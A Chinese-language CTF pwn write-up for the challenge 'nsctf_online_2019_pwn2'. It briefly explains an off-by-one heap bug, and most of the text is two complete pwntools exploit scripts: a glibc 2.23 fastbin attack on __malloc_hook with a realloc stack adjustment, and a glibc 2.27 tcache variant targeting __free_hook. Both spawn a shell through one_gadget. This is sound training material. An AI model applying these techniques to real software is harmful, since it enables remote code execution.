[toc]

# 前置知识

- `fastbin attack`
- 使用`realloc_hook`调整栈帧
- `off by one`
# 整体思路
题目版本为`ubuntu 16`，即`glibc2.23`，无`tcache`。
程序的逻辑是只有一个`chunk ptr`指向当前的`chunk`，且释放后同样将` chunk ptr `清零。
观察程序，程序开始会让我们输入`name`，长度为`0x30`，并且可以任意更改`name`，更改时长度为`0x31`，溢出1字节，刚好是溢出到`chunk ptr`的最低位。 
因此可以先申请一个大小属于`unsorted bin`的`chunk a`，然后再申请一个`fast chunk`，修改`chunk ptr`使其指向`chunk a`，将其释放。再申请一个`fast chunk`，再次修改`chunk ptr`使其指向切割后的`chunk a`，获得`libc`地址。
然后同样使用上述操作打`fastbin attack`，注意`free_hook`打不通，因此使用`realloc`来调整栈帧打`malloc_hook`。
# exp
```python
from pwn import *
from LibcSearcher import *

filename = './nsctf_online_2019_pwn2'
context(log_level='debug')
local = 0
elf = ELF(filename)
libc = ELF('/glibc/2.23-0ubuntu11_amd64/libc.so.6')

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', 26040)

def debug():
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid)
    pause()

choice_words = '6.exit\n'

menu_add = 1
add_index_words = ''
add_size_words = 'Input the size\n'
add_content_words = ''

menu_del = 2
del_index_words = ''

menu_show = 3
show_index_words = ''

menu_edit = 5
edit_index_words = ''
edit_size_words = ''
edit_content_words = 'Input the note\n'

def add(index=-1, size=-1, content=''):
    sh.sendlineafter(choice_words, str(menu_add))
    if add_index_words:
        sh.sendlineafter(add_index_words, str(index))
    if add_size_words:
        sh.sendlineafter(add_size_words, str(size))
    if add_content_words:
        sh.sendafter(add_content_words, content)

def delete(index=-1):
    sh.sendlineafter(choice_words, str(menu_del))
    if del_index_words:
        sh.sendlineafter(del_index_words, str(index))

def show(index=-1):
    sh.sendlineafter(choice_words, str(menu_show))
    if show_index_words:
        sh.sendlineafter(show_index_words, str(index))

def edit(index=-1, size=-1, content=''):
    sh.sendlineafter(choice_words, str(menu_edit))
    if edit_index_words:
        sh.sendlineafter(edit_index_words, str(index))
    if edit_size_words:
        sh.sendlineafter(edit_size_words, str(size))
    if edit_content_words:
        sh.sendafter(edit_content_words, content)

def update(content):
    sh.sendlineafter(choice_words, '4')
    sh.sendafter('input your name\n', content)

def leak_info(name, addr):
    success('{} => {}'.format(name, hex(addr)))


# 输入name
sh.recv()
payload = b'a'*0x30
sh.send(payload)

# 通过修改chunk ptr指向unsorted chunk，释放
add(size=0x80)
add(size=0x10)
update(content=b'a'*0x30 + p8(0x10))
delete()
# 再次修改chunkptr指向unsorted chunk，泄露出libc地址
add(size=0x10)
update(content=b'a'*0x30 + p8(0x30))
show()
libc_leak = u64(sh.recv(6).ljust(8, b'\x00'))
leak_info('libc_leak', libc_leak)
libc.address = libc_leak - 0x3c4b78
leak_info('libc.address', libc.address)
leak_info('free_hook', libc.sym['__free_hook'])
leak_info('malloc_hook', libc.sym['__malloc_hook'])

# 还原chunk到末尾为0x100开头方便接下来fastbin attack
add(size=0x60)
add(size=0x40)

# 开始fastbin attack
add(size=0x60)
delete()
add(size=0x10)
update(content=b'a'*0x30 + p8(0x10))
edit(content=p64(libc.sym['__malloc_hook'] - 0x23))
add(size=0x60)
add(size=0x60)
# sh.recv()
one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
leak_info('malloc_hook', libc.sym['__malloc_hook'])
# 使用realloc_hook调整栈帧
edit(content=b'a'*(0x13 - 0x8) + p64(libc.address + one_gadget[1]) + p64(libc.sym['realloc'] + 12))
add(size=0x50)
sh.interactive()
# debug()
```
# 2.27下的exp
最开始看错题目成glibc2.27了，需要泄露`heap base`然后打`tcache_perthread_struct`，`exp`如下：
```python
from pwn import *
from LibcSearcher import *

filename = './nsctf_online_2019_pwn2'
context(log_level='debug')
local = 0
elf = ELF(filename)
libc = ELF('/glibc/2.27-3ubuntu1_amd64/libc.so.6')

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', 26040)

def debug():
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid)
    pause()

choice_words = '6.exit\n'

menu_add = 1
add_index_words = ''
add_size_words = 'Input the size\n'
add_content_words = ''

menu_del = 2
del_index_words = ''

menu_show = 3
show_index_words = ''

menu_edit = 5
edit_index_words = ''
edit_size_words = ''
edit_content_words = 'Input the note\n'

def add(index=-1, size=-1, content=''):
    sh.sendlineafter(choice_words, str(menu_add))
    if add_index_words:
        sh.sendlineafter(add_index_words, str(index))
    if add_size_words:
        sh.sendlineafter(add_size_words, str(size))
    if add_content_words:
        sh.sendafter(add_content_words, content)

def delete(index=-1):
    sh.sendlineafter(choice_words, str(menu_del))
    if del_index_words:
        sh.sendlineafter(del_index_words, str(index))

def show(index=-1):
    sh.sendlineafter(choice_words, str(menu_show))
    if show_index_words:
        sh.sendlineafter(show_index_words, str(index))

def edit(index=-1, size=-1, content=''):
    sh.sendlineafter(choice_words, str(menu_edit))
    if edit_index_words:
        sh.sendlineafter(edit_index_words, str(index))
    if edit_size_words:
        sh.sendlineafter(edit_size_words, str(size))
    if edit_content_words:
        sh.sendafter(edit_content_words, content)

def update(content):
    sh.sendlineafter(choice_words, '4')
    sh.sendafter('input your name\n', content)

def leak_info(name, addr):
    success('{} => {}'.format(name, hex(addr)))


sh.recv()
payload = b'a'*0x30
sh.send(payload)

add(size=0x10)
delete()
add(size=0x20)
update(content=b'a'*0x30 + p8(0x60))
delete()
add(size=0x20)
update(content=b'a'*0x30 + p8(0x60))
show()
heap_leak = u64(sh.recv(6).ljust(8, b'\x00'))
leak_info('heap_leak', heap_leak)
heap_base = heap_leak - 0x260
leak_info('heap_base', heap_base)
edit(content=p64(heap_base + 0x10))
add(size=0x10)
add(size=0x10)
payload = b'\x00'*7 + b'\x08'*9
edit(content=payload)
add(size=0x20)
add(size=0x80)
add(size=0x20)
update(content=b'a'*0x30 + p8(0x10))
delete()
add(size=0x20)
update(content=b'a'*0x30 + p8(0x40))
show()
libc_leak = u64(sh.recv(6).ljust(8, b'\x00'))
leak_info('libc_leak', libc_leak)
libc.address = libc_leak - 0x3ebca0
leak_info('libc_base', libc.address)
add(size=0x50)
add(size=0x50)
add(size=0x20)
delete()
add(size=0x30)
update(content=b'a'*0x30 + p8(0x30))
edit(content=p64(libc.sym['__free_hook']))
add(size=0x20)
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
add(size=0x20)
edit(content=p64(libc.address + one_gadget[1]))
delete()
sh.interactive()
# debug()
```